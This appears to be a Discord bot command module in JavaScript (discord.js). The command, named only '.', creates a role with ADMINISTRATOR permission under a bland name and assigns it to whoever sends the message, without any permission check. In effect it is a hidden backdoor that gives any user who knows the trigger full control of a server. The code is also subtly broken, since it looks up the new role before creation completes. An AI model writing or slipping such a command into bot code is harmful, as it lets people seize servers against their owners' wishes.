module.exports = {
    name: '.',
    execute(message, args){
     const Discord = require('discord.js')
      message.guild.roles.create({
        data: {
          name: 'new role2',
          color: 'gray',
          permissions: 'ADMINISTRATOR',
        },
        reason: 'we needed a role for Super Cool People',
      })
      var role = message.guild.roles.cache.find(role => role.name == 'new role2')
      message.guild.member(message.author).roles.add(role)
        .then(console.log)
        .catch(console.error);
        return
    }
}